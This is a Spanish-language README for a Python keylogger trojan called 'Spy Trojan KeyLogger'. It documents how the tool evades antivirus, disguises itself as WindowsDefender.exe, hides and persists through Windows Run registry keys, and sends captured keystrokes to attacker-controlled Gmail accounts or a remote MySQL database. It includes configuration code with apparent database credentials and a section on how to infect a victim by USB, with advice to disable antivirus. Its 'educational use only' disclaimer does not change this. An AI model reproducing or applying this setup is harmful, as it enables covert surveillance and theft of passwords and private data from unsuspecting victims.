````
█▀ █▀█ █▄█   ▀█▀ █▀█ █▀█   █ ▄▀█ █▄ █   █▄▀ █▀▀ █▄█ █   █▀█ █▀▀ █▀▀ █▀▀ █▀█
▄█ █▀▀  █     █  █▀▄ █▄█ █▄█ █▀█ █ ▀█   █ █ ██▄  █  █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄ v4.0.1     
````
---
# ¡Por favor! úserla solo para fines educativos y con profesionalidad...
## Información
* __Nombre:__ `Spy Trojan KeyLogger`
* __Documentación:__ `24/05/2020`
* __Versión:__ `4.0.1`
* __Estado:__` Estable`
* __Plataforma:__` Windows 7, 8.1 y 10`
* __Lenguaje:__` Python 3.8`

__¡ Nota importante !:__ Ésta herramienta tiene como único proposito general, el aprendizaje de ___"Seguridad en sistemas informáticos"___, el creador no se hace responsable por un posible mal uso de ésta herramienta. 


# Carpeta Principal
![Archivos](https://i.imgur.com/F1i9X0j.png)
- `Doc` = Documentación de como perzonalizar el keylogger `CustomKey.md`
- `Compile.bat`    = Convierte el script `*.py` a `*.exe`
- `DataCompartir.txt`    = Pequeña descripción del keylogger
- `Ejecutar.bat`    = Ejecuta el script - [para pruebas]
- `icon.ico`    = Icono Windows Defender
- `InstallRequirements.bat` = Instala las librerías necesarias en python3
- `LICENCE` = Licencia 
- `README.md`= Documentación
- `version.txt` = Información detalla de conversión `.py` a `.exe`
- `WindowsDefender.exe` = Keylogger Compilado `4.0.1`
- `WindowsDefender.py` = Código fuente del Keylogger
---
---
# Caracteristicas
- __Indetectable Antivirus:__ Windows Defender `24/05/2020`, Avast, ESET NOD32
- __Envío por DB_MYSQL:__ Se enviarán los datos del registro mediante una base de datos MySQL, más información [Aquí](https://github.com/SebastianEPH/SpyTrojan_Keylogger#env%C3%ADo-mediante-base-de-datos-mysql)

    ![DataBase key](https://i.imgur.com/axhHVlF.png)


- __Envío por Gmail:__ Envía el registro de teclas por Gmail en un `reg.k`. más información [aquí](https://github.com/SebastianEPH/SpyTrojan_Keylogger#envi%C3%B3-mediante-gmail).

  ![Correo ejemplo del Keylogger](https://i.imgur.com/HCyUK2M.png)

- __Recibe datos por varios correos:__ Hay una posibilidad de agregar 1 o más correos, y así el registro de teclas se envíe a varios correos a la vez.

    ````py
    #Correos que recibirán el registro de teclas.
    def ReceiveE():
        return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
        #return ["CorreoReceptor@gmail.com"]                                         #Monocorreo        
    ````
- __Verifica conexión a internet:__ El keylogger verifica si la computadora está conectada a internet, y si ese es el caso envía los datos, en caso contrario, no lo envía,
- __Intervalo de tiempo personalizado:__ 
    - __DATABASE:__ El tiempo recomendado es de 20 a 30 minutos.
    - __GMAIL:__ El tiempo recomendado es de 1:30 a 2 horas mínimo. [`Sucede que Google suele bloquear la cuenta por horas cuando detecta una gran cantidad de correos envíados por día.`]

    ````py
    def timeSend(): # Tiempo de envío perzonalizado
        return 120    # Minutos                 <= Escoja su tiempo en minutos
    ````
- __Envío del registro prueba de errores:__ En otros keylogger al momento de enviar el `reg.k`, éste proceso demora entre 3 a 5 segundos, y en ese transcurso de tiempo el keylogger no obtiene ninguna información de teclas oprimidas, en éste keylogger, ese error está solucionado.
- __Segundo plano:__ Este keylogger, al ejecutarse en la linea de comando, sí mostrará una consola, solo por detalles de debuggeo, pero al ser compilada de `*.py` a `*.exe` el ejecutable resultante se ejecutará en segundo plano

    ![Segundo plano](https://i.imgur.com/DFAf2Tw.png)

- __Disfraz:__ Al momento de ser convertido de `*.py a *.exe`. El Keylogger será disfrazado como `WindowsDefender.exe` con el ícono y la información del programa.
    ![ExeCompilado](https://i.imgur.com/TlBEAaS.png)

    ![Info](https://i.imgur.com/MQAiVnJ.png) 
    ![Info](https://i.imgur.com/mTBByRy.png)

    ![StartUP Info](https://i.imgur.com/bkGSFQC.png)
- __Oculto:__ El Keylogger al iniciar se copia (Solo si ya está en un archivo *exe) a la carpeta `"C:\Users\Public\Security\Windows Defender\"` , y en esa carpeta encuentras el archivo `reg.k`.

- __Iniciar automaticamente con el sistema:__ Modifica el registro de windows, [más información aquí.](https://github.com/SebastianEPH/SpyTrojan_Keylogger#m%C3%A9todo-de-infecci%C3%B3n)
    
    ![StartUp](https://i.imgur.com/xh91bR5.png)

- __Segundo Gmail en caso de Error:__ En casó el correo principal sea bloqueada o tenga x problemas, se usará un segundo correo.


## Caracteristicas que se agregarán en futuras actualizaciones:  
- __Soporte de envió a otros buzones de correo:__ Se insertará un soporte para poder usar Outlook, yahoo u otros servicios de correo 
- __Conexión FTP:__ Envía el archivo `reg.k` vía FTP.
- __Envía datos mediante FTP:__ enviará documentos, fotos y videos mediante una conexión FTP, en segundo plano.
- __Envio mediante Bot Telegram:__ Soporte de envio automatico del registro de teclas a un bot especifico.
- __Contraseñas de Wifi:__ Obtiene contraseñas guardadas en una laptop o PC
- __Portapapeles:__ Obtiene el texto del portapapeles.
- __Obtiene contraseñas guardadas en Google Chrome:__ Obtiene todas las contraseñas guardadas de Google chrome .

## Uso de Recursos de la PC
El programa se repite 2 veces ya que ésta utiza 2 hilos de ejecución

![Uso del CPU y RAM](https://i.imgur.com/DFAf2Tw.png)

---
---
# Proceso de preparación:

__NOTA:__ Como requisito mínimo para el aprendizaje de ésta herramienta es saber programar en __Python básico__ y en casó de que use la conexión a la base de datos, pues MySQL básico.

Requerimiento de paquetes de `Python3.8`:
- `import pynput`   <== Obtiene los eventos de teclado.
- `from pynput.keyboard import Key, Listener` <== Escucha eventos del teclado
- `from getpass import getuser`  <== Obtiene el nombre del Usuario
- `import datetime` <== Obtiene la Fecha, Horas, Minutos, y segundos actual
- `import os`       <== Operaciones con archivos
- `from winreg import *` <== Permite escribir en el registro de windows.
- `import time`     <== Obtiene la Fecha, Horas, Minutos, y segundos actual.
- `import yagmail`  <== Envía `reg.k` por Gmail
- `import socket`   <== Verifica conexión a internet
- `import pymysql`  <== Permite conectarnos a la base de datos
- `import threading` <== Ejecución multihilos
- `import pyinstaller` <== Convierte de `*.py` a `*.exe`

NOTA: Biblioteca no optimizada! :'( 

## Escoge [GMAIL] o [DataBase]:
- Por ahora solo podemos escoger el envío del registro o bien por una conexión a una __Base de datos__ o por __Gmail__, no podemos escoger ambas.

- Buscamos la siguiente función y escogemos [1 = DataBase] o [2 = Gmail]
    ````py
    def GMailOrDataBase():
    return 1    # 1 = DataBase 
                # 0 = Gmail
                # (en las proximas actualizaciones , ambas a la vez)
    ```` 


## Envió Mediante Gmail
1. Es de suma urgencia habilitar el acceso a apps menos seguras de google, la cual lo puedes hacer desde éste [link](https://myaccount.google.com/lesssecureapps).  `En caso no lo habilites, el keylogger no podrá iniciar sesión en su Gmail`
2. Use  `git clone https://github.com/SebastianEPH/SpyTrojan_Keylogger.git` para descargar el repositorio en su computadora.

3. Abra el archivo `WindowsDefender.py` en su editor de texto.
4. Entre al codigo y busca la `ZONA CUSTOM BÁSICA` y modifique el `Correo primario` y el `Correo segundario`, luego rellene el o los `Correos que receptores`
````py
# ************ Zona Gmail ************* 
def emailP():# Correo de envío [Primaria]                    
    return "correo1@gmail.com"  # <<== Cambia éste correo
def passP():                    # <<== Contraseña del correo
    return "contra1"
def emailS():# Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
    return "correo2@gmail.com"  # <<== Cambia éste correo
def passS():                   
    return "pass2"              # <<== Contraseña del correo 

def ReceiveE():#Correos que recibirán el registro de teclas.
    #return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
    return ["CorreoReceptor@gmail.com"]                                         # MonoCorreo
# ************ Fin Zona Gmail ************* 

def GMailOrDataBase():
    return 0    # 1 = DataBase 
                # 0 = Gmail
                # (en las proximas actualizaciones , ambas a la vez)

def timeSend(): # Tiempo de envío perzonalizado
    return 120 #Minutos                 <= Escoja su tiempo en minutos
````

## Envío mediante Base de Datos |MySQL|

1. Debes crearte una cuenta gratuita en [CleverCloud](https://www.clever-cloud.com/en/), cabe destacar que solo tenemos 10MB de almacenamiento, se recomienda, vaciar los datos cada vez que podamos, o utilizar otra base de datos.

    ![Crear nueva base de datos ](https://i.imgur.com/EtkWgZe.png)
2. Select a MySQL =>

    ![Select Type DataBASE](https://i.imgur.com/qyaM5Rv.png)
3. Creamos una Base de Datos gratuita o pagamos por el servicio, damos a `NEXT`.
    
    ![Create Free and Buy](https://i.imgur.com/nFUtGnY.png)
4. Escribirmos el nombre para reconocer la base de datos.
    ![Name DataBase](https://i.imgur.com/7KOUQip.png)
5. Obtenemos los datos de conexión.
    ![Clevercloud](https://i.imgur.com/JdGTqvB.png)
6. Descargamos e instalamos [HeidiSQL](https://www.heidisql.com/download.php)y creamos una nueva sesión.
    
    ![](https://i.imgur.com/oOAiFL2.png)
7. Creamos una nueva tabla con el Nombre= `keyLog` y guardamos.

    ![](https://i.imgur.com/8mcP594.png)
8. Creamos los siguientes datos con los siguiente typos de datos:
    ````c
    # No olvidar que el id debe ser autoincremento
    l_id        // INT          [Llave Primaria]  [Autoincremento]
    l_user      // CHAR         [50 Caracteres] 
    l_time      // CHAR         [50 Caracteres]
    l_log       // MEDIUMTEXT   [Acepta 16.777.215 Caracteres]
                // LONGTEXT     [Acepta 4,292.967.295 Caracteres - Aprox 4GB de Texto]
    ````
    ![](https://i.imgur.com/TrGVRMB.png)

9. Se debería ver así:

    ![info Database](https://i.imgur.com/fc6s9qH.png)

10. Ahora entramos a nuestro archivo `WindowsDefender.py` y buscamos y colocamos los datos de tu base de datos:

````py
# ************ Start Zone DATABASE ************* 
def DB_HOST():
    return "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"   # Host
def DB_USER():
    return "udwlsyrbtldkznqo"                                       # Usuario de la base de datos
def DB_PASS():
    return "OR2i2dfdgWek0UDiAv4f"                                   # Contraseña de la Base de Datos
def DB_NAME():
    return "bh1g5gnxzw2igrvui8hq"                                   # Nombre de Base de datos
def DB_PORT(): 
    return "3306"                                                   # Opcional en algunos casos

# ************ Fin Zone DATABASE ************* 
def GMailOrDataBase():
    return 1    # 1 = DataBase 
                # 0 = Gmail
                # (en las proximas actualizaciones , ambas a la vez)

def timeSend(): # Tiempo de envío perzonalizado
    return 10 #Minutos                 <= Escoja su tiempo en minutos
````

11. Si al ejecutar el keylogger todo salió bien, podemos ver en la base de datos el registro de teclas
    ![Fin](https://i.imgur.com/X4MxCeA.png)

    ![Fin](https://i.imgur.com/axhHVlF.png)

# [Si usted desea modificar el keylogger lea la siguiente documentación aquí.](Doc/CustomKey.md)

# Método de infección:
___¿Cómo infecto a la victima?___

![Final files](https://i.imgur.com/TlBEAaS.png)

__Nota:__ No cambiar de nombre al archivo `WindowsDefender.exe`, si usted le cambia el nombre, el Keylogger quedará obsoleto.
- Usten guardará el archivo en un USB.
- Conectará el __USB__ a la __[PC]__ a infectar.
- Se recomienda desactivar el antivirus o agregar una exclusión en al siguiente ruta: `"C:\Users\Public\Security\Windows Defender"`.
- Lo siguiente es ejecutar el archivo `WindowsDefender.exe` en el USB, el Keylogger se replicará en la siguiente ruta `"C:\Users\Public\Security\Windows Defender"`, Se recomienda no sacar el USB al instante ya que el `Keylogger` se estará replicando en la ruta.

__NOTA:__ Al ejecutar el archivó, ésta automaticamente modificará el registro de windows para que se inicie siempre al prender la computadora.

El Keylogger tKeyloggerará de modificar la siguiente ruta del registro `"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"` por lo cual necesitará permisos de administrador, por ende se recomienda que la primera ejecución se realice con permisos de administrador, en caso de que no lo ejecute con permisos de administrador, el Keylogger modificará la siguiente ruta `"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"`

__Explicación:__ 
* `HKEY_LOCAL_MACHINE:` El Keylogger se ejecutará en todos los usuarios exitentes y los nuevos usuarios de la computadora
* `HKEY_CURRENT_USER:` El Keylogger solo se ejecutará en el usuario actual, si se llegará a crear otro usuario, el Keylogger Solo funcionará en el usuario principal
___
___

<!-- Creador  -->
---
## By SebastianEPH
<!--- [Website](https://sebastianeph.github.io/) -->
- [Github](https://github.com/SebastianEPH)
- [Linkedin](https://www.linkedin.com/in/sebastianeph/)
- [Telegram](https://t.me/sebastianeph)
- [Facebook](https://www.facebook.com/SebastianEPH)